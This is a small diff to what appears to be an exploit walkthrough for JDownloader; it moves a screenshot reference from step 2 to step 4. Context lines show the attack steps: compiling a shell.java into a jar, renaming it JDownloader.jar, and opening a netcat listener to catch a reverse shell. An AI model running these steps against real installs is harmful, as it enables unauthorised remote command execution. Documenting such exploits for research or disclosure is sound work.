@@ -25,7 +25,7 @@ You can upload a .jar file to JDownloader and change its name to `JDownloader.ja
 javac -target 1.8 -source 1.8 shell.java
 jar cmf manifest.mf myprogram.jar shell.class
 ```
-![](screenshots/step2.png)
+
 
 # Step 3: Start server and listener
 
@@ -42,6 +42,8 @@ Terminal 2 : `nc -nvlp <PORT>`
 4.2 Enter your ip like so 'http://<IP>:8081'
 
 4.3 Ensure the directory next to the save icon is the same installation directory from step 1.2
+
+![](screenshots/step4.png)
 
 # Step 5: Change file names 
 
